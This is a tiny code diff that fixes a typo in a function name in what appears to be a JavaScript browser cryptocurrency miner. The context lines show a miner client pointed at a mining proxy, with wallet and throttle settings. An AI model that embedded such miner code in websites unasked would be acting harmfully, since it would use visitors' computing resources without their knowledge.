@@ -22,7 +22,7 @@ var throttleMiner = 0;  // percentage of miner throttling. If you set this to 20
 
 var handshake = null;
 
-function CoffeTime(wallet, worker, throttle) {
+function CoffeeTime(wallet, worker, throttle) {
     var miner = new Client.Anonymous(
         "wss://yourproxy.com:8181", // your mining proxy
         wallet,
